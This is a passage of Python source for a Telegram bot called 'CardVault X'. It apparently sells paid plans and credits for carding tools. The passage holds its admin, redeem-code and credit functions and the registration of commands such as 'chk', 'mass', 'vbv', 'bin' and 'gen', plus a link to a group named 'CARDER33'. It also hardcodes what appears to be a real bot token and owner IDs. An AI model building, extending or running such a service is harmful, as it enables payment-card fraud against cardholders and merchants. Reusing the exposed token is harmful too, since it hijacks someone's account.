            parse_mode=ParseMode.MARKDOWN_V2
        )

    except ValueError:
        return await update.effective_message.reply_text(
            "❌ Invalid user ID format\\. Please provide a valid integer user ID\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )


def generate_congrats_box(user_id: int, plan: str, access_level: str, date: str, first_name: str) -> str:
    from telegram.helpers import escape_markdown
    return (
        f"╭━━━[ 🎉 𝐂𝐨𝐧𝐠𝐫𝐚𝐭𝐬, {escape_markdown(first_name, version=2)}\\! ]━━━╮\n"
        f"┃\n"
        f"┃ ✨ *Access to* ⚡ `𝓒𝓪𝓻𝓭𝓥𝓪𝓾𝓵𝓽𝑿` *has been granted\\.*\n"
        f"┃\n"
        f"┃ 🆔 *𝙄𝘿*             : `{user_id}`\n"
        f"┃ 💎 *𝙋𝙡𝙖𝙣*           : `{plan}`\n"
        f"┃ 🧰 *𝘼𝙘𝙘𝙚𝙨𝙨 𝙇𝙚𝙫𝙚𝙡*   : `{access_level}`\n"
        f"┃ 📅 *𝘿𝙖𝙩𝙚*           : `{date}`\n"
        f"┃ 🔓 *𝙎𝙩𝙖𝙩𝙪𝙨*         : `✔ Activated`\n"
        f"┃\n"
        f"╰━━━━━━━━━━━━━━━━━━━━━━━╯\n"
        f"\n"
        f"💠 *𝕎𝕖𝕝𝕔𝕠𝕞𝕖 𝕥𝕠 𝓒𝓪𝓻𝓭𝓥𝓪𝓾𝓵𝓽𝓧* — 𝙉𝙤 𝙡𝙞𝙢𝙞𝙩𝙨 𝙅𝙪𝙨𝙩 𝙥𝙤𝙬𝙚𝙧\\.\n"
        f"𝙔𝙤𝙪’𝙧𝙚 𝙣𝙤𝙬 𝙖 𝙥𝙧𝙤𝙪𝙙 𝙢𝙚𝙢𝙗𝙚𝙧 𝙤𝙛 𝙩𝙝𝙚 *𝗘𝗹𝗶𝘁𝗲 {escape_markdown(plan, version=2)} 𝗧𝗶𝗲𝗿*\\.\n"
        f"\n"
        f"🍷 *𝓣𝓱𝓪𝓷𝓴𝓼 𝓯𝓸𝓻 𝓬𝓱𝓸𝓸𝓼𝓲𝓷𝓰 𝓒𝓪𝓻𝓭𝓥𝓪𝓾𝓵𝓽𝓧\\!* 𝙔𝙤𝙪𝙧 𝙖𝙘𝙘𝙚𝙨𝙨 𝙞𝙨 𝙣𝙤𝙬 𝙤𝙥𝙚𝙣\\."
    )


async def auth_group(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Authorizes a group to use the bot."""
    if update.effective_user.id not in ADMIN_IDS:
        return await update.effective_message.reply_text("🚫 You are not authorized to use this command.")

    if not context.args or not context.args[0].strip('-').isdigit():
        return await update.effective_message.reply_text(
            "❌ Invalid format\\. Usage: `/au [chat_id]`", 
            parse_mode=ParseMode.MARKDOWN_V2
        )
    
    try:
        chat_id = int(context.args[0])
        if chat_id > 0:
            return await update.effective_message.reply_text(
                "❌ That is not a group chat ID\\. Make sure you provide a valid group chat ID that starts with `-`\\.", 
                parse_mode=ParseMode.MARKDOWN_V2
            )

        AUTHORIZED_CHATS.add(chat_id)
        await update.effective_message.reply_text(
            f"✅ Group with chat ID `{chat_id}` has been authorized\\.", 
            parse_mode=ParseMode.MARKDOWN_V2
        )

    except ValueError:
        return await update.effective_message.reply_text(
            "❌ Invalid chat ID format\\. Please provide a valid integer chat ID\\.", 
            parse_mode=ParseMode.MARKDOWN_V2
        )


import os
import asyncpg
from telegram import Update
from telegram.ext import ContextTypes

ADMIN_USER_ID = 8493360284  # Replace with your admin user ID

async def reset_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await update.message.reply_text("❌ You are not authorized to use this command.")
        return

    if not context.args or not context.args[0].isdigit():
        await update.message.reply_text("⚠️ Usage: /reset <amount_of_credits>\nExample: /reset 500")
        return

    new_credits = int(context.args[0])
    database_url = os.getenv("DATABASE_URL")
    if not database_url:
        await update.message.reply_text("❌ DATABASE_URL environment variable not set.")
        return

    try:
        conn = await asyncpg.connect(dsn=database_url)
        await conn.execute("UPDATE users SET credits = $1", new_credits)
        await conn.close()
    except Exception as e:
        await update.message.reply_text(f"❌ Database error: {e}")
        return

    await update.message.reply_text(f"✅ All user credits have been reset to {new_credits}.")


async def remove_authorize_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Removes a user's private access and resets their plan."""
    if not context.args or not context.args[0].isdigit():
        return await update.effective_message.reply_text(
            "❌ Invalid format\\. Usage: `/rauth [user_id]`",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    try:
        user_id = int(context.args[0])

        if user_id in AUTHORIZED_PRIVATE_USERS:
            AUTHORIZED_PRIVATE_USERS.remove(user_id)

            # Update the user in the database
            await update_user(
                user_id,
                plan='Free',
                status='Free',
                credits=DEFAULT_FREE_CREDITS,
                plan_expiry='N/A'
            )

            await update.effective_message.reply_text(
                f"✅ User `{user_id}` has been de-authorized and plan reset to Free\\.",
                parse_mode=ParseMode.MARKDOWN_V2
            )
        else:
            await update.effective_message.reply_text(
                f"ℹ️ User `{user_id}` was not in the authorized private list\\.",
                parse_mode=ParseMode.MARKDOWN_V2
            )
    except ValueError:
        return await update.effective_message.reply_text(
            "❌ Invalid user ID format\\. Please provide a valid integer user ID\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )

import re
import uuid
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Global redeem code storage (if not already defined)
REDEEM_CODES = {}

# Escape function for MarkdownV2
def escape_markdown_v2(text: str) -> str:
    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', text)

async def gen_codes_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generates 10 redeem codes for the Starter Plan."""
    generated_codes = []
    for _ in range(10):
        code = str(uuid.uuid4()).replace('-', '')[:12].upper()
        REDEEM_CODES[code] = {
            'plan_name': 'Starter Plan',
            'credits': 300,
            'duration_days': 7
        }
        generated_codes.append(code)

    code_list_text = "\n".join([f"`{escape_markdown_v2(code)}`" for code in generated_codes])

    response_text = (
        "✅ *10 new redeem codes for the Starter Plan have been generated:* \n\n"
        f"{code_list_text}\n\n"
        "These codes are one\\-time use\\. Share them wisely\\."
    )

    await update.effective_message.reply_text(response_text, parse_mode=ParseMode.MARKDOWN_V2)

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Redeems a code to activate a plan."""
    user = update.effective_user
    user_id = user.id

    if not context.args or len(context.args) != 1:
        return await update.effective_message.reply_text(
            "❌ Invalid format\\. Usage: `/redeem [code]`",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    code = context.args[0].upper()
    plan_details = REDEEM_CODES.get(code)

    if not plan_details:
        return await update.effective_message.reply_text(
            "❌ Invalid or already used code\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    user_data = await get_user(user_id)
    if user_data.get('plan') != 'Free':
        return await update.effective_message.reply_text(
            "❌ You already have an active plan\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Apply the plan and remove the used code
    plan_name = plan_details['plan_name']
    credits = plan_details['credits']
    duration_days = plan_details['duration_days']
    await _update_user_plan(user_id, plan_name, credits, duration_days)
    del REDEEM_CODES[code]

    response_text = (
        f"🎉 Congratulations\\! Your `{escape_markdown_v2(plan_name)}` has been activated\\.\n"
        f"You have been granted `{credits}` credits and your plan will be active for `{duration_days}` days\\.\n"
        f"Your private access is now active\\."
    )

    await update.effective_message.reply_text(response_text, parse_mode=ParseMode.MARKDOWN_V2)


async def handle_unauthorized_commands(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles commands that are not explicitly authorized for the user/chat."""
    # This handler is a fallback and can be used for logging or a generic message.
    pass

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Log the error and send a user-friendly message if possible."""
    logger.error("Exception while handling an update:", exc_info=context.error)
    if update and update.effective_message:
        try:
            await update.effective_message.reply_text("❌ An unexpected error occurred\\. Please try again later or contact the owner\\.", parse_mode=ParseMode.MARKDOWN_V2)
        except Exception as e:
            logger.error(f"Failed to send error message to user: {e}")



# === REGISTERING COMMANDS AND HANDLERS ===
import os
import logging
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    MessageHandler,
    filters
)
from db import init_db

# 🛡️ Security
AUTHORIZED_CHATS = set()  # Groups you manually authorize
OWNER_ID = 8493360284     # Replace with your Telegram user ID

# 🔑 Bot token
BOT_TOKEN = "8482235621:AAGoRfV7pFVAcXJxmSd0P4W2oKljXbJDv9s"

# ✅ Logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


# 🚫 Unauthorized firewall handler
async def block_unauthorized(update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🚫 This group is not authorized to use this bot.\n\n"
        "📩 Contact @K4linuxx to get access.\n"
        "🔗 Official group: https://t.me/CARDER33"
    )


# 🧠 Database init
async def post_init(application):
    await init_db()
    logger.info("Database initialized")


# 🎯 MAIN ENTRY POINT
def main():
    # Build app
    application = ApplicationBuilder().token(BOT_TOKEN).post_init(post_init).build()

    # 📌 Register Commands
    application.add_handler(CommandHandler("close", command_with_check(close_command, "close")))
    application.add_handler(CommandHandler("restart", command_with_check(restart_command, "restart")))
    application.add_handler(CommandHandler("start", command_with_check(start, "start")))
    application.add_handler(CommandHandler("cmds", command_with_check(cmds_command, "cmds")))
    application.add_handler(CommandHandler("info", command_with_check(info, "info")))
    application.add_handler(CommandHandler("credits", command_with_check(credits_command, "credits")))
    application.add_handler(CommandHandler("chk", command_with_check(chk_command, "chk")))
    application.add_handler(CommandHandler("mchk", command_with_check(mchk_command, "mchk")))
    application.add_handler(CommandHandler("mass", command_with_check(mass_command, "mass")))
    application.add_handler(CommandHandler("mtchk", command_with_check(mtchk, "mtchk")))
    application.add_handler(CommandHandler("sh", command_with_check(sh_command, "sh")))
    application.add_handler(CommandHandler("seturl", command_with_check(seturl, "seturl")))
    application.add_handler(CommandHandler("mysites", command_with_check(mysites, "mysites")))
    application.add_handler(CommandHandler("msp", msp))
    application.add_handler(CommandHandler("sp", command_with_check(sp, "sp")))
    application.add_handler(CommandHandler("site", command_with_check(site, "site")))
    application.add_handler(CommandHandler("msite", command_with_check(msite_command, "msite")))
    application.add_handler(CommandHandler("gen", command_with_check(gen, "gen")))
    application.add_handler(CommandHandler("open", command_with_check(open_command, "open")))
    application.add_handler(CommandHandler("adcr", command_with_check(adcr_command, "adcr")))
    application.add_handler(CommandHandler("bin", command_with_check(bin_lookup, "bin")))
    application.add_handler(CommandHandler("fk", command_with_check(fk_command, "fk")))
    application.add_handler(CommandHandler("scr", command_with_check(scrap_command, "scr")))
    application.add_handler(CommandHandler("vbv", vbv))
    application.add_handler(CommandHandler("fl", command_with_check(fl_command, "fl")))
    application.add_handler(CommandHandler("num", num_command))
    application.add_handler(CommandHandler("status", command_with_check(status_command, "status")))
    application.add_handler(CommandHandler("redeem", command_with_check(redeem_command, "redeem")))

    # 🔐 Admin Commands
    owner_filter = filters.User(OWNER_ID)
    application.add_handler(CommandHandler("admin", admin_command, filters=owner_filter))
    application.add_handler(CommandHandler("give_starter", give_starter, filters=owner_filter))
    application.add_handler(CommandHandler("give_premium", give_premium, filters=owner_filter))
    application.add_handler(CommandHandler("give_plus", give_plus, filters=owner_filter))
    application.add_handler(CommandHandler("give_custom", give_custom, filters=owner_filter))
    application.add_handler(CommandHandler("take_plan", take_plan, filters=owner_filter))
    application.add_handler(CommandHandler("au", auth_group, filters=owner_filter))
    application.add_handler(CommandHandler("reset", reset_command))
    application.add_handler(CommandHandler("rauth", remove_authorize_user, filters=owner_filter))
    application.add_handler(CommandHandler("gen_codes", gen_codes_command, filters=owner_filter))

    # 📲 Callback & Error Handlers
    application.add_handler(CallbackQueryHandler(handle_callback))
    application.add_error_handler(error_handler)

    # 🔁 Start polling
    logger.info("Bot started and is polling for updates...")
    application.run_polling()


if __name__ == '__main__':
    main()
